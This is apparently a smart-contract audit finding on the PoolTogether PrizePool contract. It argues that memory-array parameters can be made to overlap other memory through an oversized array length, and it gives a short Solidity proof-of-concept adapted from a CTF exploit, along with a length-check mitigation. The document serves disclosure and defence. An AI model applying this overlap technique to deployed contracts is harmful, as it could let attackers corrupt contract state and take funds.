# Handle  JMukesh   # Vulnerability details  ## Impact Using memory array parameters (e.g. uint[] memory) as function parameters can be tricky in Solidity, because an attack is possible with a very large array which will overlap with other parts of the memory.  ## Proof of Concept  https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/PrizePool.sol#L219  https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/PrizePool.sol#L639   This an example to show the exploit:  // based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol  pragma solidity ^0.4.24; // only works with low solidity version  contract test{     struct Overlap {         uint field0;     }     event log(uint);    function mint(uint[] memory amounts) public  returns (uint) {   // this can be in any solidity version        Overlap memory v;        v.field0 = 1234;        emit log(amounts[0]); // would expect to be 0 however is 1234        return 1;      }    function go() public { // this part requires the low solidity version       uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251       bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x);       bool success=address(this).call(payload);   } }     ## Tools Used  manual analysis  ## Recommended Mitigation Steps check the array length before using it
